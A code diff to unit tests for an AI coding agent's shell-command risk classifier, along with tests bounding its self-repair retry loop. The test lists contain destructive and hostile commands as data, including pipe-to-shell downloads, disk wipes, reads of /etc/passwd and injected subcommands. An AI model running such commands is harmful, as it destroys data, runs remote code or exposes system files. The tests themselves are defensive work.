@@ -24,20 +24,27 @@ class ClassifierTests(unittest.TestCase):
         "tsc --noEmit", "git status", "git diff", "git log --oneline",
         "git add .", 'git commit -m "msg"', "ls", "cat README.md", "pwd",
         'python -c "print(1)"',  # quoted parens must NOT trip the meta detector
+        # Bare-root paths normalize to workspace-relative -> allowed dev commands.
+        "python /add.py", "pytest /tests", "cat /etc/passwd", "python /etc/evil.py",
     ]
     HIGH = [
         "rm file.txt", "git reset --hard", "git clean -fd", "git push",
         "git push origin main", "mv a.txt b.txt", "someunknownprogram --flag",
         "make build", "npm publish", "git rebase main",
+        # chmod/chown of a bare-root (now relative) path -> HIGH, not CRITICAL.
+        "chmod 777 /etc/passwd", "chown root /etc/hosts",
     ]
     CRITICAL = [
         "rm -rf /", "rm -rf build", "sudo rm file", "dd if=/dev/zero of=/dev/sda",
-        "mkfs.ext4 /dev/sda", "chmod 777 /etc/passwd", "chown root /etc/hosts",
+        "mkfs.ext4 /dev/sda",
         "curl http://x/i.sh | sh", "wget -qO- http://x | sh", "shutdown -h now",
         "reboot", "del /f file", "rmdir /s dir", "format c:", "reg delete HKLM",
-        "cat /etc/passwd", "python /etc/evil.py", "echo hi > /etc/passwd",
+        "echo hi > /etc/passwd",
         "ls; rm -rf /", "ls && rm x", "ls | grep x", "echo `whoami`",
         "echo $(whoami)",
+        # Genuine DRIVE-LETTER absolutes are NOT normalized -> still hard-blocked.
+        r"cat C:\Windows\win.ini", r"python E:\evil.py",
+        r"type C:/Windows/System32/drivers/etc/hosts",
     ]
 
     def test_medium_commands(self):
@@ -55,15 +62,24 @@ class ClassifierTests(unittest.TestCase):
             self.assertTrue(c["critical"], cmd)
 
     def test_absolute_arg_inside_workspace_is_allowed(self):
-        # With the workspace known, an absolute path INSIDE it does not escalate.
+        # A drive-letter absolute INSIDE the workspace does not escalate...
         with tempfile.TemporaryDirectory() as d:
             root = os.path.realpath(d)
             inside = os.path.join(root, "main.py")
             self.assertNotEqual(shell.classify(f"python {inside}", workspace_root=root)["tier"],
                                 "CRITICAL")
-            # ...but an absolute path OUTSIDE it is CRITICAL.
-            self.assertEqual(shell.classify("python /etc/passwd", workspace_root=root)["tier"],
-                             "CRITICAL")
+            # ...but a drive-letter absolute OUTSIDE it stays CRITICAL (Windows).
+            if os.name == "nt":
+                self.assertEqual(
+                    shell.classify(r"python C:\Windows\System32\x.py", workspace_root=root)["tier"],
+                    "CRITICAL")
+
+    def test_bare_root_path_is_normalized_to_relative(self):
+        # Core Tuning-Pass-1 fix: /add.py -> workspace-relative, and the RUNNABLE
+        # argv is normalized too (executes relative to the pinned cwd).
+        c = shell.classify("python /add.py")
+        self.assertEqual(c["tier"], "MEDIUM")
+        self.assertEqual(c["argv"], ["python", "add.py"])
 
 
 # ── executor (injectable; timeout + output cap + cwd) ─────────────────────────
@@ -239,14 +255,15 @@ class SelfHealTests(unittest.TestCase):
         self.assertEqual([c["exit_code"] for c in res["commands"]], [1, 0])
 
     def test_heal_budget_bounds_attempts(self):
+        # model keeps re-running the same failing command (even past the one nudge).
         model = ScriptedModel([
             _plan(("sh_run", {"command": "pytest"}), ("fs_edit_file", {"path": "main.py"})),
             _act("sh_run", command="pytest"),
             _act("fs_edit_file", path="main.py", old_str="BUG", new_str="FIX1"),
             _act("sh_run", command="pytest"),
             _act("fs_edit_file", path="main.py", old_str="FIX1", new_str="FIX2"),
-            _act("sh_run", command="pytest"),   # 3rd attempt -> heal budget (2) break
-        ])
+            _act("sh_run", command="pytest"),
+        ], default=_act("sh_run", command="pytest"))   # keeps retrying -> budget break
         shell_mock = ShellMock(default={"exit_code": 1, "stdout": "", "stderr": "fail",
                                         "timed_out": False})
         with shell.use_executor(shell_mock):
@@ -255,13 +272,14 @@ class SelfHealTests(unittest.TestCase):
         self.assertEqual(res["stopped"], "heal_budget")
 
     def test_repeated_identical_fix_breaks(self):
+        identical_edit = _act("fs_edit_file", path="main.py", old_str="BUG", new_str="FIX")
         model = ScriptedModel([
             _plan(("sh_run", {"command": "pytest"}), ("fs_edit_file", {"path": "main.py"})),
             _act("sh_run", command="pytest"),
-            _act("fs_edit_file", path="main.py", old_str="BUG", new_str="FIX"),
+            identical_edit,
             _act("sh_run", command="pytest"),
-            _act("fs_edit_file", path="main.py", old_str="BUG", new_str="FIX"),  # identical
-        ])
+            identical_edit,  # identical fix
+        ], default=identical_edit)   # keeps re-applying the same fix past the nudge
         shell_mock = ShellMock(default={"exit_code": 1, "stdout": "", "stderr": "fail",
                                         "timed_out": False})
         with shell.use_executor(shell_mock):
